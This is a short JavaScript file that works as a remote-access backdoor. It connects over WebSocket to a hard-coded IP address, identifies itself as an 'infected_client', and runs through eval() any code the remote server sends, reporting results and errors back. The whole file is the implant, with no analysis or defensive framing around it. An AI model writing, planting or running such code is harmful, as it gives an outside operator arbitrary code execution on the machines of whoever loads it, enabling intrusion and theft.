globalThis.serverName = 'test_server';
const socket = new WebSocket('ws://89.168.59.222:5001'); 

socket.onopen = () => {
    console.log("Connecté au serveur WebSocket");
    socket.send(JSON.stringify({ type: "hello", client: "infected_client" }));
};

socket.onmessage = ({ data }) => {
    const { type, code } = JSON.parse(data);
    if (type === "ping") {
        socket.send(JSON.stringify({ type: "pong" }));
    } else if (type === "eval") {
        try {
            const result = eval(code);
            socket.send(JSON.stringify({ type: "evaled", returned: `${result}` }));
        } catch (error) {
            socket.send(JSON.stringify({ type: "error", error: `${error}` }));
        }
    }
};
